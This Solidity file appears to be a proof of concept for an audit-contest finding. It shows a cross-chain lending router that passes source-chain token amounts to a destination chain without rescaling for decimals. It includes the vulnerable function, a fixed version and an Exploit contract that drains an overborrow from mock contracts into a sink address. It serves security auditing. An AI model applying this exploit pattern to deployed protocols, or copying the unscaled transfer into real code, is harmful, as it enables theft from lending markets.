// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// =============================================================================
//  LEND H-11 — cross-chain borrow ignores per-chain token decimals
//  (sherlock 2025-05-lend-audit-contest, CoreRouter.sol L195-205 @ 713372a1).
//
//  The borrow `amount` is validated on the SOURCE chain (in the source token's
//  decimals) and passed verbatim over LayerZero to the DESTINATION chain, where
//  `CoreRouter.borrowForCrossChain` transfers `_amount` raw units of the DEST
//  token WITHOUT re-scaling for its decimals. When the same logical asset has
//  more decimals on the source chain than the destination (e.g. 18 vs 6), the
//  destination transfer over-pays by 10^(srcDec-destDec) — a ~1e12x overborrow
//  that drains the destination market against tiny collateral.
//
//  `borrowForCrossChain` is reproduced VERBATIM (marked @>). The lToken market
//  and underlying token are faithful minimal doubles.
// =============================================================================

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface LErc20Interface {
    function borrow(uint256 amount) external returns (uint256);
}

/*//////////////////////////////////////////////////////////////
        Minimal ERC20 with CONFIGURABLE decimals (the asset)
//////////////////////////////////////////////////////////////*/
contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   Minimal Compound-style lToken market for the DEST underlying.
   borrow(amount): sends `amount` underlying from the market's cash
   reserve to the caller (CoreRouter) and returns 0 on success — the
   opaque money-market boundary the router borrows from.
//////////////////////////////////////////////////////////////*/
contract LErc20 {
    Token public immutable underlying;

    constructor(Token _underlying) {
        underlying = _underlying;
    }

    function borrow(uint256 amount) external returns (uint256) {
        // Market cash is finite: an over-scaled amount drains it.
        if (underlying.balanceOf(address(this)) < amount) return 1; // borrow failed
        underlying.transfer(msg.sender, amount);
        return 0;
    }
}

/*//////////////////////////////////////////////////////////////
   CoreRouter — VULNERABLE. borrowForCrossChain reproduced verbatim:
   the DEST transfer uses `_amount` (source-chain units) unadjusted.
//////////////////////////////////////////////////////////////*/
contract CoreRouter {
    address public crossChainRouter;

    function setCrossChainRouter(address r) external {
        crossChainRouter = r;
    }

    /**
     * @dev Only callable by CrossChainRouter
     */
    function borrowForCrossChain(address _borrower, uint256 _amount, address _destlToken, address _destUnderlying)
        external
    {
        require(crossChainRouter != address(0), "CrossChainRouter not set");

        require(msg.sender == crossChainRouter, "Access Denied");

        // @> _amount is the amount validated on the SOURCE chain in the SOURCE
        // @> token's decimals; it is used to borrow and transfer DEST tokens
        // @> with NO re-scaling for the destination decimals.
        require(LErc20Interface(_destlToken).borrow(_amount) == 0, "Borrow failed");

        IERC20(_destUnderlying).transfer(_borrower, _amount);
    }
}

/*//////////////////////////////////////////////////////////////
   CoreRouterFixed — mitigation: re-scale the amount from source
   decimals to destination decimals before borrowing/transferring.
//////////////////////////////////////////////////////////////*/
contract CoreRouterFixed {
    address public crossChainRouter;

    function setCrossChainRouter(address r) external {
        crossChainRouter = r;
    }

    function borrowForCrossChain(
        address _borrower,
        uint256 _amount,
        address _destlToken,
        address _destUnderlying,
        uint8 srcDecimals,
        uint8 destDecimals
    ) external {
        require(crossChainRouter != address(0), "CrossChainRouter not set");
        require(msg.sender == crossChainRouter, "Access Denied");

        uint256 scaled = _amount;
        if (srcDecimals > destDecimals) {
            scaled = _amount / (10 ** (srcDecimals - destDecimals));
        } else if (destDecimals > srcDecimals) {
            scaled = _amount * (10 ** (destDecimals - srcDecimals));
        }

        require(LErc20Interface(_destlToken).borrow(scaled) == 0, "Borrow failed");
        IERC20(_destUnderlying).transfer(_borrower, scaled);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — plays the CrossChainRouter (the only authorized caller).
   The user borrowed the equivalent of 1,000 tokens; the source token
   is 18-decimals so the validated amount is 1_000e18. The destination
   token is 6-decimals (e.g. USDC), so the borrower SHOULD receive
   1_000e6. The bug transfers 1_000e18 raw units of the 6-dec token =
   1e15 tokens — a 1e12x overborrow. The excess is routed to a sink.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // overborrow sink

    uint8 internal constant SRC_DECIMALS = 18;
    uint8 internal constant DEST_DECIMALS = 6;
    uint256 internal constant INTENDED_TOKENS = 1_000;

    // Amount validated on the source chain, in source-token (18-dec) units.
    uint256 internal constant SRC_AMOUNT = INTENDED_TOKENS * (10 ** SRC_DECIMALS); // 1_000e18
    // What the borrower SHOULD receive on the destination chain (6-dec units).
    uint256 internal constant INTENDED_DEST = INTENDED_TOKENS * (10 ** DEST_DECIMALS); // 1_000e6

    Token public destUnderlying;
    LErc20 public destLToken;
    CoreRouter public core;

    function run() external payable {
        destUnderlying = new Token("USD Coin", "USDC", DEST_DECIMALS);
        destLToken = new LErc20(destUnderlying);
        core = new CoreRouter();
        core.setCrossChainRouter(address(this)); // this contract is the CrossChainRouter

        // The destination market holds enough cash for the (over-scaled) borrow.
        destUnderlying.mint(address(destLToken), SRC_AMOUNT * 2);

        // Source-validated amount (1_000e18) flows over LayerZero unadjusted.
        core.borrowForCrossChain(address(this), SRC_AMOUNT, address(destLToken), address(destUnderlying));

        uint256 received = destUnderlying.balanceOf(address(this)); // == 1_000e18 units
        uint256 excess = received - INTENDED_DEST; // everything over the intended 1_000e6

        // Route the overborrowed excess to the sink so measured profit == overborrow.
        destUnderlying.transfer(SINK, excess);
    }
}
